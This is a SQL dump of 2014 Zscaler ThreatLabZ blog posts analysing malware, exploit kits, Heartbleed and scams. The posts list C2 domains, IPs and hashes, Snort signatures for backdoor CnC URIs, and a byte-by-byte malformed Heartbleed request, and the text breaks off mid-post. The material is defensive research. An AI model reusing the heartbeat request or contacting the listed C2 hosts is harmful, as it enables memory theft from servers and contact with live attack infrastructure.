INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (193, 'Backdoor Xtrat Continues To Evade Detection', 'ThreatLabz', 'May 11, 2014', 'While reviewing recent reports scanned by ZULU, we came across a malicious report that drew our attention. It was notable as the final redirection downloaded ZIP content by accessing a PHP file on the domain \'www.stisanic.com\'.       URL: hxxp://www[.]stisanic[.]com/wp-content/coblackberrycomnotasdevozdate07052014[.]php                ZULU\'s virustotal check scored the file as higher risk. At the time 10 vendors on VT detected the ZIP file as malicious.        	File : coblackberrycomnotasdevozdate07052014.zip   	md5 : d7d6574a443909b04b1ac76fb07b8dc2   	VT Report : 10/52                        The ZIP file contained an EXE. Once again, only 10 vendors flagged the executable as malicious on VT.         	File: coblackberrycomnotasdevozdate07052014.exe   	md5: bd06e73db5b169120723206998a6074a   	VT Report: 10/52        The ZULU report turned out be live example of Backdoor Xtrat, which is a relatively old threat but one that many AV vendors are still not consistently detecting. AV vendors had first released a signature for this malware in May 2011 (MS advisory). The poor AV detection is the result of a common challenge - the attackers consistently alter the binary and there are numerous variants. This is of course a known limitation of signature based approaches and something that attackers regularly take advantage of. It\'s also a reason why security vendors, like Zscaler, are increasingly relying on behavioral analysis when analyzing binary files. Behavioral analysis doesn\'t rely on signatures or require any prior knowledge of the threat and is a key component in the Cloud-based APT solution that Zscaler released in 2013.          Zscaler behavioral analysis report:           	  		  			  		  		  			Screen capture of the Zscaler Behavioral Analysis report for Backdoor.Xtrat  		  	             Typical behavior of this backdoor:       	Injects itself into svchost.exe, exploere.exe and iexplore.exe  	Drops PE files  	Performs network activity to accept commands from a remote server and sends data to the remote server        Dropped file details:    The backdoor drops the following two EXE files on victim\'s machine. Both of the EXE files are same, but are dropped with different names.      	vbc.exe/wintegfire.exe  	  		md5 : 6fb9ce258a2420d898b6d0fa4d73bb8f  		VT Report : 6/52 (Also very less detection)  	  	    Network Activity:      The backdoor downloads content from \'analaloca.chickenkiller.com\' over port 3460.     	URL: hxxp://analaloca[.]chickenkiller[.]com:3460/123456.functions   	IP: 181[.]135[.]149[.]40  	Zulu report: 100/100              CnC Server Location:         CnC URLs with the above pattern of \'/123456.functions\':    cascarita1.no-ip.biz:33100/123456.functions  cascarita2.no-ip.biz:33200/123456.functions  cascarita3.no-ip.biz:33500/123456.functions  windows.misconfused.org:999/123456.functions  uranio2.no-ip.biz:10180/123456.functions  fungii.no-ip.org:999/123456.functions  mohammad2010.no-ip.biz:81/123456.functions supermanaa.no-ip.biz/123456.functions  updating.serveexchange.com:999/123456.functions  spycronicjn.no-ip.org:81/123456.functions  allmyworkers.no-ip.biz:400/123456.functions  livejasminci.no-ip.biz:4444/123456.functions  31.193.9.126:3377/123456.functions    We also observed CnC URLs related to this backdoor with a small variation in the pattern. The pattern varinat observed was \'/1234567890.functions\'.      CnC URLs with pattern \'/1234567890.functions\':   suportassisten.no-ip.info:2180/1234567890.functions   laithmhrez.no-ip.info/1234567890.functions  papapa-1212.zapto.org/1234567890.functions  sarkawt122.no-ip.biz/1234567890.functions  outlook11551.no-ip.biz/1234567890.functions       Snort signatures:       alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Backdoor Xtrat URL Request\"; flow:established,to_server; content:\"/123456.functions\"; http_uri; nocase; classtype:trojan-activity; reference:\'\'; sid:XXXXX; rev:XX;)      alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Backdoor Xtrat URL Request\"; flow:established,to_server; content:\"/1234567890.functions\"; http_uri; nocase; classtype:trojan-activity; reference:\'\'; sid:YYYYY; rev:YY;)          We are seeing new CnC domains related to this attack every day. This shows that the attack remains active.         Avoid this backdoor and stay safe !      Pradeep', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/backdoor-xtrat-continues-evade-detection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (194, 'Bitcoin Miner Utilizing IRC Worm', 'Chris Mannon', 'May 09, 2014', 'Bitcoin miners have given a new reason for attackers to communicate en mass with infected users.  IRC worms are not exactly the most hip way to communicate, but they remain effective at sending and receiving commands.  I recently came across several samples which bit coin mining examples leveraging IRC.  The malicious binary, once installed, queries for the network shares connected to the victim\'s PC, drops a file, and creates an autorun.inf file to infect anyone unfortunate enough to use that same network share.    First, we see that the threat has many different variants at a single location    	  		  			  		  		  			A portion of the malicious content on this IP.  		  	        This IP\'s urlquery report is also picking up some shady content on this IP.  Unfortunately, the Virustotal score at the time of analysis was 1/52.    The first thing the threat does is install itself to any network shares on the victim\'s system.       	  		  			  		  		  			The file \'snkb0pt.exe\' is installed in \'netshare:/snkb0pt/\'  		  	        	  		  			  		  		  			It also installs an autorun.inf file among files used to store content retrieved from victims.  		  	      Next, it installs itself as a service on the victim\'s PC to ensure that it can\'t easily be removed. Image File Execution Options are also created.  This will ensure that the malware can install as the \"debugger\" for a frequently-run program (such as Explorer) and thereby inject itself into the execution sequence.  Further explanation about this methodology seen here.       	  		  			  		  		  			A service is created along with edits to Image File Execution Options.  		  	        	  		  			  		  		  			Autorun additions are also created to establish itself at boot.  		  	    The malicious network share file is clearly calling shell32.dll in order to exploit other systems connected to this network share through a created autorun.inf file.        	  		  			  		  		  			That clsid is allows the executable to launch differently than in Explorer.  		  	        	  		  			  		  		  			The export file stored in the network share stores information about what systems are infected.  		  	      There was not much IRC activity, but the framework exists to login to the attackers channel and receive commands for further action.       	  		  			  		  		  			Connection is established  		  	           	  		  			  		  		  			First attempt  		  	           	  		  			  		  		  			A connection remains open, beaconing for further contact.  		  	      I analyzed all available samples and compiled a list of phone home DNS requests made by all the variants.    	  		  			  		  		  			Of all samples collected, these dns requests were made.  		  	      Due to the high volume of variation in the samples, standard AV solutions only catch certain instances of the threat.    Sample 1    Sample 2    In the second instance, we see that some vendors have flagged the malware as a bitcoin miner.  A sandbox analysis of the second sample has strings related to a Bitcoin Mining application known as xptminer.     The implications are that this threat infects one user and anyone connecting to a malicious network share. Infected machines then begin communicating to a server which manages bitcoin mining operations.', 'Exploit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/bitcoin-miner-utilizing-irc-worm');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (195, 'Heartbleed Check Added To ZULU', 'Michael Sutton', 'April 17, 2014', 'Many of you already regularly use ZULU, our free service for analyzing any URL to determine it\'s overall risk and we\'ve just made it better by adding a \'heartbleed\' check.  ZULU operates by applying a variety of checks to the content, URL and host for a given web page, along with doing the same for external page elements. You will now note that the Content Checks section includes a Heartbleed OpenSSL Check.    	  		  			  		  		  			Vulnerable Result Shown for Heartbleed OpenSSL Check  		  	    For more information on why heartbleed is such a serious vulnerability, take a look at our earlier blog which details how exploitation occurs. In a nutshell, the heartbeat TLS extension allows one machine to send a small packet to another to keep a TLS connection open. That request includes a small message, which the responding machine subsequently includes in the reply. The problem occurs as the request also includes a parameter indicating the size of the message, which is not properly validated in some versions of OpenSSL. Therefore, if the size value is larger than the actual size of the message, the response will also include random data from memory to fill the void. This is a serious data leakage issue as the response could include sensitive information such as passwords, cookies and even private encryption keys. The impact of this vulnerability is also exacerbated by the fact that OpenSSL is such a popular SSL implementation, leaving many popular websites vulnerable.    Now when you run a ZULU scan, as part of the overall content checks, we also send a heartbeat request to port 443 on the server. We check to see if an SSL server is present and if it will respond to a request where the specified message size does not match the actual length of the message. If that\'s the case, the report will state \'Heartbleed OpenSSL Result: Vulnerable\' in the report and the overall score will be adjusted accordingly.    - michael', 'Vulnerability', 'https://www.zscaler.com/blogs/research/heartbleed-check-added-zulu');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (196, 'Why You Should Care About The OpenSSL Heartbleed Vulnerability', 'Michael Sutton', 'April 08, 2014', 'Yesterday, researchers from Google and Codenomicon made quite a splash when they revealed details of a vulnerability in OpenSSL\'s implementation of the heartbeat extension, which they have affectionately dubbed heartbleed.  In short, heartbleed represents a classic example of a simple programming oversight - not properly validating the length of a message, which leads to a serious memory leak.\r\n\r\nWhy is this such a big deal?\r\nBreadth and depth - Heartbleed impacts the most common implementation of SSL/TLS (OpenSSL), which is used on the majority of web servers. In fact, according to Netcraft, in April 2014, Apache and nginx, two of the most popular web servers that both include vulnerable Open SSL implementations, account for 66% of active web servers. As for depth, the impact of the vulnerability is significant and trivial to exploit. A simple request will return up to 64 KB of random data from server memory. This data could include extremely sensitive information such as private encryption keys and authentication credentials. To make matters worse, there are no logs of such requests, so a victim won\'t even know that they were attacked and the exploit can be sent over and over, retrieving new data every time.\r\n\r\nHow does it work?\r\nThe heartbeat extension is defined in RFC 6520 and was added to the TLS protocol to provide a simple means of keeping a TLS session alive. Think of it as a small packet that the client sends to the server to let it know that it\'s still around. The problem occurs, because that simple packet includes the length of the payload that it\'s sending, which isn\'t properly validated. If the actual payload is smaller that the payload length value, the server will return random data from memory to fill the void. There is already plenty of PoC exploit code for this vulnerability readily available on the web if you want to test your own servers.  Let\'s break down a sample heartbeat request to illustrate the vulnerability (some hexadecimal values have been converted to decimal in the description).\r\n\r\n|18 03 02 00 0A 01 40 00 4D 49 43 48 41 45 4C|\r\n|#1| #2  | #3  |#4| #5  |         #6         |\r\n\r\n#1 - Type = 24\r\n#2 - Version = 0x302\r\n#3 - Data length = 10 (#4 + # 5 + #6)\r\n#4 - TLS1_HB_REQUEST\r\n#5 - Total payload length (16,384 bytes)\r\n#6 - Data (\'MICHAEL\')\r\nThe problem?\r\nIn this example, the data length is 10 bytes, while the total length of the payload is set to 16,384 bytes. Due to improper bounds checking, the server ultimately returns both the data sent in the heartbeat request, along with whatever else happens to come after it in memory. In the screenshot below, you can clearly see the heartbeat payload (\'MICHAEL\') sent to a vulnerable server, is followed by random browser headers - likely from a recently requested webpage on that server.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Data leakage from a web server vulnerable to the OpenSSL \'heartbleed\' attack \r\n		\r\n	\r\n\r\n\r\nThe verdict\r\nThis is a serious threat. Use freely available tools such as this handy web app to quickly check your servers to determine if you\'re vulnerable. If you are, either upgrade OpenSSL to 1.0.1g or recompile your existing OpenSSL version with -DOPENSSL_NO_HEARTBEATS compile time option.\r\n\r\n- michael', 'Vulnerability', 'https://www.zscaler.com/blogs/research/why-you-should-care-about-openssl-heartbleed-vulnerability');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (197, 'Corporate Users Dive Into March Madness', 'Chris Mannon', 'April 04, 2014', 'Here in the ThreatlabZ, we track stats and trends for all Zscaler customers. While our primary focus is on malicious traffic, it\'s intriguing to also track surges of traffic caused by non-security events.  We weren\'t surprised to see the NCAA basketball March Madness games cause peak traffic in both the Streaming Media and Sports categories.  There are clearly no shortage of users that participate in bracket-ology.\r\n\r\nThe graphic below shows the spike in Sports and Streaming data, which shows an interesting bandwidth trend when viewed as a percentage of total traffic seen on that particular day.  To benchmark normal traffic, I also calculated Pre-Madness traffic shown as March 17th. The first two full days of the tournament occurred on Thursday March 20th and Friday March 21st. I omitted the weekend games as Zscaler receives corporate traffic so a drop in overall traffic on the weekend is already predictable.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The typical amount of Sports Streaming data doubles during the first Round.\r\n		\r\n	\r\n\r\n\r\n\r\n\r\nOn Thursday and Friday (March 20th and 21st), the initial two full days of the tournament, Sports and Streaming traffic nearly doubled, primarily due to March Madness. The third round (March 27th and 28th) wasn\'t quite as popular. Perhaps our customers has already had their brackets busted at that point! The surge in traffic during the opening round is an impressive stat when you consider that Zscaler receives traffic from enterprises all over the world and March Madness is a US based event. A single sporting event, in one country can actually be popular enough that it can cause a significant spike in traffic for a given category on a global scale\r\n \r\n \r\n \r\n\r\n \r\nUser\'s have more than one way to watch these games.  The use of mobile devices like the iPad, iPhone and Android devices are responsible for a significant portion of this traffic spike as well.  Below is the Sports and Streaming traffic seen from mobile devices during this time-frame.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			User\'s preferred to watch the games on their iPad devices.\r\n		\r\n	\r\n\r\n \r\n\r\n \r\nWhile companies may not want to block access to such content, they may also not be aware of the percentage of bandwidth that can be consumed during a major sporting event. It\'s always worthwhile to keep track of such spikes and ensure that QoS controls are in place to ensure that such traffic is at least throttled to ensure that it doesn\'t negatively impact business critical activities.', 'Cloud', 'https://www.zscaler.com/blogs/research/corporate-users-dive-march-madness');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (198, 'Walkthrough Of A Recent Zbot Infection And Associated CnC Server', 'Rubin Azad', 'March 25, 2014', 'During routine ThreatLabZ log analysis, we encountered the following malicious Zbot executable connecting back to it\'s CnC and exfiltrating data via POST requests.           	MD5: 0b43d6a65f67ef48f4da3a1cc09335a1  	Size: 442368 bytes  	Detected as PWS:Win32/Zbot by Microsoft (VT 43/49)    [POST DATA]             iTpRAQWetIVVzRx502Gqds3DKmG80ru/P1ggedWTJAgrue/EVaoL95bMH6K0It8I9/wGHEIKbkXhcoxGOKgJOxGFYkvfoWsUM/NWAUQ+wdjlZOpD0Ke77Sob6rQT0WToRF9lWkhx514Es9wGHNKTn5xrTY7pJeqxGiTNMsB3fsCFfjZZKabmhwDzKTP/0W6FFEJb       What separated this discovery from your average CnC server? The attackers were kind enough to leave the CnC server largely exposed (directory browsing enabled, many files not password protected) to provide a rare behind the scenes look at a live botnet operation. Let\'s walk through what we observed.      The above mentioned Zbot variant was responsible for dropping the following malicious files:    	6ca1690720b3726bc76ef0e7310c9ee7 - Win32/Stoberox.B (VT 26 / 50)  	d2c6a0e888d66882d7dc29667c4c9ec0 - TrojanDownloader:Win32/Cutwail (VT 38/50)    We also noted that it started a server listening on ports 1548 and 3492 and sends some data via POST requests to hxxp://vodrasit.su/admin/gate.php  (see malwr sandbox report).    Domains contacted:    	shivammehta.com [ IP: 181.224.129.14]  	merdekapalace.com [IP: 202.71.103.21]  	vodrasit.su [IP: 37.115.13.224]    IPs contacted:       	  		  			Malicious IP  			Virus total links  		  		  			99.42.33.76  			https://www.virustotal.com/en/ip-address/99.42.33.76/information/  		  		  			115.126.143.176  			https://www.virustotal.com/en/ip-address/115.126.143.176/information/  		  		  			50.179.168.36  			https://www.virustotal.com/en/ip-address/50.179.168.36/information/  		  		  			158.58.230.200  			https://www.virustotal.com/en/ip-address/158.58.230.200/information/  		  		  			212.186.32.8  			https://www.virustotal.com/en/ip-address/212.186.32.8/information/  		  		  			61.27.49.175  			https://www.virustotal.com/en/ip-address/61.27.49.175/information/  		  		  			86.133.91.153  			https://www.virustotal.com/en/ip-address/86.133.91.153/information/  		  		  			206.205.226.130  			https://www.virustotal.com/en/ip-address/206.205.226.130/information/  		  		  			172.245.217.122  			https://www.virustotal.com/en/ip-address/172.245.217.122/information/  		  		  			80.213.146.163  			https://www.virustotal.com/en/ip-address/80.213.146.163/information/  		  		  			81.206.227.11  			https://www.virustotal.com/en/ip-address/81.206.227.11/information/  		  		  			91.21.200.217  			https://www.virustotal.com/en/ip-address/91.21.200.217/information/  		  		  			1.240.64.211  			https://www.virustotal.com/en/ip-address/1.240.64.211/information/  		  		  			24.184.76.143  			https://www.virustotal.com/en/ip-address/24.184.76.143/information/  		  		  			97.104.63.159  			https://www.virustotal.com/en/ip-address/97.104.63.159/information/  		  		  			172.11.217.35  			https://www.virustotal.com/en/ip-address/172.11.217.35/information/  		  		  			87.1.90.206  			https://www.virustotal.com/en/ip-address/87.1.90.206/information/  		  		  			81.149.88.233  			https://www.virustotal.com/en/ip-address/81.149.88.233/information/  		  		  			203.110.94.69  			https://www.virustotal.com/en/ip-address/203.110.94.69/information/  		  		  			50.11.239.126  			https://www.virustotal.com/en/ip-address/50.11.239.126/information/  		  		  			181.224.129.14  			https://www.virustotal.com/en/ip-address/181.224.129.14/information/  		  		  			108.162.199.119  			https://www.virustotal.com/en/ip-address/108.162.199.119/information/  		  		  			202.71.103.21  			https://www.virustotal.com/en/ip-address/202.71.103.21/information/  		  		  			65.55.172.254  			https://www.virustotal.com/en/ip-address/65.55.172.254/information/  		  		  			120.150.210.249  			https://www.virustotal.com/en/ip-address/120.150.210.249/information/  		  	      While looking at the POST data submitted to hxxp://vodrasit.su/admin/gate.php, we explored this site and found that it is currently hosting two malicious files and a password protected admin console.    Below are the files which are hosted on hxxp://vodrasit.su/, which can be observed thanks to the fact that the attackers left directory browsing enabled:    [   ]  admin.zip 03-Mar-2014 09:49 12M    [DIR] admin/ 21-Aug-2013 23:44    [   ]  all.exe 21-Mar-2014 17:36 457K  [   ]  rok.exe 21-Mar-2014 06:23 75K                 	a68b10d96eb89af7388d4daa64071ad1 | rok.exe | VT: 3/50 | VT_Link | Malwr_Sandbox_Link   	76fe3432c75ee724a8f20ea97696bd17 2/50 | all.exe | VT: 2/50 | VT_Link | Malwr_Sandbox_Link    all.exe attempted to communicate to the followings DGA generated Domains:      	aulbbiwslxpvvphxnjij.biz  	kvdmkndexomrceqydtgepr.net  	gadmxsmfeqrscmfytvksirnyxm.com  	xgkzhahdqsxgusireqxdqkzsk.ru  	aemfyldumrlithbaayzhib.com  	jbqswspnseqsqwmrnzxodivuciv.net  	ijfifyhydeydxwdnrkuwsovofm.org  	lrtofahqzlvrsxsscdaykzuqs.info  	dgmeulrobvsfaskdrknkfswyt.biz  	cqdwgydskztyluwhjzcmmjlfqs.ru  	hiciqglzaqwopnzdmtkdro.com  	xgadhizdspnditwhdaxcjae.info  	bypjgqusdmeanbylqghtvcqkead.org  	civmvcibuhjzuoijxrozaegmfi.biz  	ijrtkzdjbztgattccytojrswsd.com  	igaytdmoqkmfauzdbmrwrceapf.ru  	jbtkscmfuuygmdmdrorodfmp.com  	sougwcinroivgtpvjzijuocagqau.net  	hiufeamaqsyxmntswooronrnvz.biz  	bymncecukrcusxvctsduxceu.info  	prdmzrmreylvkqqodj.com  	sbusxwswayizfepfydtoovvbqhm.ru  	yhayxjzmbpscaypizlnftofl.com  	tkytijfhiaqbymnxkxcwxg.biz      Admin Console  Although we weren\'t able to access the live admin console as it was password protected, we were able to replicate the setup from the exposed source files (hxxp://vodrasit.su/admin.zip) and it would appear as shown below:                    Another directory with browsing enabled exists at hxxp://vodrasit.su/admin/db/. Here the data from infected machines connecting back to the CnC server can be observed:         Before being transmitted from a victim machine, the data is encrypted using RC4 encryption, base64 encoded and then sent via the POST method to the CnC.    Here is the code for first decoding the data using base64 decoding and then RC4 decryption:                  After decoding and decrypting, a record is created in the aforementioned directory hxxp://vodrasit.su/admin/db/.    The following a sample of the information stored from an infected victim:         What does this data represent?              This particular record includes the following:           	OS: WINDOWS 7  	Bits: 0 means OS is 32 BIT   	Country: SOUTH KOREA      We are continuing to track these malicious Domains and IP addresses and advise you to block them too.    - rubin', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/walkthrough-recent-zbot-infection-and-associated-cnc-server');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (199, 'Scams Taking Advantage Of Malaysia Airlines 370 Disappearance', 'Michael Sutton', 'March 21, 2014', 'I spent some time today looking for sites that are taking advantage of the disappearance of Malaysia Airlines flight 370 (MH370) to profit from the tragedy. Unsurprisingly, it was all too easy to find examples of this as it is almost a given that scammers will attempt to profit from any breaking news story, especially those where the public is desperate for the latest tidbit of news - regardless of where it may be coming from.\r\nAdvertising Scam\r\nThe first example is an advertising scam. The scam begins with the infection of a legitimate site, in this case debiworley[dot]com, a personal website for a photographer. A subdomain has been added to the site, which hosts different scams, all leveraging the same approach. In the case of the MH370 scam, an alleged video has been posted to alert[dot]debiworley[dot]com/news/?mh370. At that page you\'ll see the image shown below, which purports to show a Malaysian Airlines plane crashed in the jungle:\r\n \r\n\r\n\r\n \r\n\r\nThe page includes the fake video and also includes comments formatted to appear as though they\'re from Facebook. Despite the look of the page, everything is simply an image. Clicking anywhere on the video doesn\'t actually play the video, but instead prompts the user to share the video on Facebook by presenting the following popup, before it can be played.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nIf the user chooses to share the video, it does not ever play, but instead simply shares the scam with their Facebook friends. What the victim is promoting is a quickly hacked together site hosted at vinreox[dot]com, a simple website that acts as a front end for various YouTube videos and the owner profits from advertisements on the site.\r\n\r\n \r\n\r\n\r\n\r\nNote: The owner of the infected website has been informed of the infection.\r\n\r\nPay-Per-Click Scam\r\n\r\nThis time around, the scam appears to be hosted at a site controlled by the attacker. There are various URLs on the domain that ultimately link to the same content, but one in particular (rentadp[dot]com/malaysia/) appears to be piggybacking on the MH370 disappearance. When visiting that URL, the victim is redirected to a completely fake Facebook page.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nOnce again, most of the page is nothing more than an image and the only links either refresh the page or prompt the user to share the scam on their real Facebook profile before they can view the video. It would appear that the scammers were a bit lazy this time as despite the URL referencing \'Malaysia\', they\'ve clearly used a picture of US Airways Flight 1549, which crash landed on the Hudson river in 2009.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nShould users choose to share the scam, they won\'t ever see the video, but instead will be redirected to a pay-per-click scam which requires yet another task, this time around the victim must fill out one of three surveys before they can proceed. This is where the the scammers make money. They\'re paid a few cents for every survey completed.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nUnfortunate that anyone would seek to profit from a tragedy, but unfortunately, this has now become the norm.\r\n\r\n \r\n\r\n- Michael', 'Phishing', 'https://www.zscaler.com/blogs/research/scams-taking-advantage-malaysia-airlines-370-disappearance');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (200, 'LightsOut EK Targets Energy Sector', 'Chris Mannon', 'March 12, 2014', 'Late last year, the story broke that threat actors were targeting the energy sector with Remote Access Tools and Intelligence gathering malware.  It would seem that the attackers responsible for this threat are back for more.  This particular APT struck late February between 2/24-2/26.  The attack began as a compromise of a third party law firm which includes an energy law practice known as Thirty Nine Essex Street LLP (www[.]39essex[.]com).  The victim site is no longer compromised, but viewers should show restraint and better browsing practices when visiting.       	  		  			  		  		  			39essex.com shown as a referral URL to suspicious site.  		  	        The compromise leads the victim to another site which provides the attacker with a specific user-agent in the URL field.  The purpose of this is to pass along diagnostics to the attacker so that the proper malicious package is sent to the victim.  This should be taken as a point of identification in administrator logs as this may indicate an attack on your network.       	  		  			  		  		  			At the time of research, the Java Class file was returning 404.  		  	           There are several other locations which show similar activity that are also related to this threat.  Malicious redirects come from IP address 174[.]129[.]210[.]212 should also be taken as suspicious as well as some sites hosted on this domain (aptguide[.]3dtour[.]com).    The URLquery and VirusTotal entries for this IP corroborates the notion that this location played a part in using LightsOut Exploit Kit.        LightsOut performs several diagnostic checks on the victim\'s machine to make sure that it can be exploited.  This includes checking the browser and plugin versions.       	  		  			  		  		  			The deobfuscated Javascript sheds some light on the iframe injection.  		  	           	  		  			  		  		  			More JS Deobfuscation  		  	           	  		  			  		  		  			Checking to see what version of Adobe is installed.  		  	           	  		  			  		  		  			Checking to see if you are IE7.  		  	           	  		  			  		  		  			Checking to see if Java is enabled in the browser.  		  	      Ultimately, a payload is delivered from the LightsOut Exploit kit, which attempts to drop a malicious JAR file exploiting CVE-2013-2465. At the time of research, the binary file was no longer available, which suggests that the attack window has now closed for this particular watering hole.  However, other security sources tell us that the site used in the attack is also a known HAVEX RAT CnC.    The recent activity of this threat originating from a site in the energy sector should serve as a warning to those in the targeted industry.  Prior research from other sources tells us that the threat actors involved are highly motivated and agile.  Their motive is to gather intelligence for further attacks, so be on your guard and monitor transaction logs for suspicious activity!', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/lightsout-ek-targets-energy-sector');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (201, 'Probing Into The Flash Zero Day Exploit (CVE-2014-0502)', 'ThreatLabz', 'February 21, 2014', 'Yesterday, a targeted campaign leveraging a Flash zero day exploit hit the news. Adobe has now released a security bulletin regarding this vulnerability. Based on the attack vector mentioned in prior research, we have concluded that recently observed .SWF exploitation is related to the recent zero-day threat flagged as CVE-2014-0502. Upon successful infection, the exploited victim is served a RAT (Remote Access Trojan).     While we were doing our daily review of logs, we found a significant number of transactions related to this campaign. We specifically started looking for those compromised servers which have been mentioned in prior research.  We began investigating all suspicious transactions which used a known compromised site as a referral location.            After some brief inspection of this location, we found not only the malicious .SWF, but also all other connected malicious files detailed in the analysis below. We will cover the dropped Flash file that exploits the vulnerability using an image that contained embedded shell code. This shellcode is then used to download the malware.    The Flash file was found to be encrypted using the DoSWF flash encryptor.           Upon throwing the Flash file into an ActionScript viewer, we immediately see the script shown below. The script tries to make a URL Request to a GIF Image file, which contains the embedded shellcode for an ROP exploit.       The script checks for the presence of a cookie labeled \'XPT2013111\'. If this cookie is not already present, it sets the same.               The script then checks the operating system version and in the case of Windows XP, further checks the OS language. Details of the OS language and version are then used to determine the base address for the exploit. In case of Windows 7, the script further probes for unpatched and outdated versions of Java (Web Start 1.6 and 1.7) or Microsoft Office (Sharepoint OpenDocuments 3 or 4).          Here we can see on XP, based on the version and language, the base address for the exploit is determined by the script. Then the ROP sled is built to carry out the exploit.       The GIF image used for embedding the shellcode is shown below, which of course seems innocuous to the victim.                                            When opened in a hex editor, the magic bytes for a GIF image file can be seen.                 However, upon careful examination, we further see extra bytes appearing toward the end of the image as shown below.                         Using a shellcode emulator like libemu, we can see that this extra data represents the shellcode to be executed.                    Here we see that the shellcode makes a call to the LoadLibraryA function and then to VirtualProtect to allocate memory in which to place the shellcode. It then checks for the /temp folder path and makes calls to InternetOpenUrlA to download the malware from a remote location http://[x.x.x.x]/common/update.exe and drops it into the /temp folder.    A sandbox analysis of the final dropped file can be seen here.    Browser plugins continue to be the Achilles heel of enterprise security. While enterprises struggle to ensure that browser plugins are up to date on all end user systems to prevent browser exploit kits from targeting known vulnerabilities, here we see yet another demonstration where even that is not enough. Attackers continue to identify and exploit 0day vulnerabilities in popular web browser plugins such as Adobe Flash, which unfortunately has a long history of dealing with such threats.', 'Analysis;Exploit;Vulnerability;Zero Day', 'https://www.zscaler.com/blogs/research/probing-flash-zero-day-exploit-cve-2014-0502');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (202, 'New Asprox Variant Goes Above And Beyond To Hijack Victims', 'Chris Mannon', 'February 04, 2014', '[UPDATE] After further analysis, this threat was identified as Asprox botnet and not Zbot    Asprox is an extremely venomous threat, which has strong persistent tactics to ensure that the victim remains infected despite removal attempts. We will get to the overabundance of methods used to keep the victim infected later on. First, I\'ll share some of the latest download locations for this threat, which researchers should take note of:    	hxxp://king-orbit[.]com/libs11.18/ajax/  	hxxp://message-tvit[.]com/libs17.19/ajax/  	hxxp://bidcos-fact[.]com/libs20.17/ajax/  	hxxp://vespula-grants[.]com/libs31.56/jquery/  	hxxp://bee-smoka[.]com/libs29.89/ajax/    The bulk of these threats are tied to a server found in Russia: 88[.]85[.]215[.]129.    Reminiscent of other malicious infections, the second the threat is run, it deletes itself in order to hinder researchers when conducting a reverse engineering analysis of the attack. The next step is to create a Security Center Task in Windows, to ensure that even if the threat is removed, it will reoccur.       	  		  			  		  		  			The filename is randomly generated.  		  	           	  		  			  		  		  			Note the filename of the .job file, which is dropped on the victim\'s machine.  This name is randomly generated.  		  	      In addition to ensuring that the threat restarts if the victim were to reboot, it also disables key Windows processes to hinder removal of the threat.  This includes disabling Safe Boot registry keys.       	  		  			  		  		  			This disables users access to boot into Safe Mode to run standard AV solutions.  		  	    Once installed and hooked into the victim\'s environment, it begins the task of phoning home to its Command & Control (CnC) location for tasks to complete.  Periodically, it will receive a GET request from the CnC to make sure that the victim is still listening.       	  		  			  		  		  			Hi! to you too.  		  	    Given the stealth tactics employed by this threat, you may not be aware of the infection straight away.  You may however become suspicious when you start to feel the drag on your Internet connection. Behind the scenes, the threat is actively reaching out to several different ad servers as a means to promote ad revenue for the attacker.  Below is only a portion of the servers that were contacted in the course of a few minutes.               	  		  			  		  		  			All transactions do not take place in the browser, but behind the scenes.  		  	      Administrators concerned for their user\'s safety should take note of usage patterns.  It won\'t be difficult to spot a user sending out absurd amounts of ad traffic.  You can either look through your logs for large amounts of advertisement traffic OR find HTTP POST requests with the string \'/b/opt/\' in the URI path.       	  		  			  		  		  			2.254 Mbps!!!  		  	    While this threat is persistent, it is easy to spot from a Network Administrator\'s point of view.  The information provided should be enough to find your infected users to take them off of the network until remediation of the threat can be completed.    You can find open source sandbox analysis of this threat here and here.  There is also a more detailed analysis found here.    Mind Your Clicks.', 'Malware', 'https://www.zscaler.com/blogs/research/new-asprox-variant-goes-above-and-beyond-hijack-victims');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (203, 'Analysis Of A VBScript Bot', 'ThreatLabz', 'January 24, 2014', 'Introduction:         In the long list of complex threats that we see daily, it is interesting to see malware that is rather simple but effective in terms of the payload that it carries. At Zscaler ThreatLabZ, we recently     came across one such innocent looking Bot, which targeted our customers. The file arrived as an attachment to a spam email message. The malware was written in VBScript.         Analysis:               Virustotal scan results show 14 out of 50 vendors detecting the malware.                          	  		  			  		  		  			Figure 1: Virus-total Result  		  	                               The image below shows the malware opened in notepad. We can see that the file is obfuscated. That’s because the file has a “.vbe” extension (a “.vbe” is an encoded VBscript file), which would otherwise have a “.vbs” extension. The encoding support is provided to prevent people from reading the script.                     	  		  			  		  		  			Figure 2: Obfuscated VBScript  		  	                     To be persistent, the malware copies itself into the startup folder in Windows (Figure 3)                	  		  			  		  		  			Figure 3: Copy of Malware in the startup folder  		  	                          Registry entry created by the malware to run itself at the 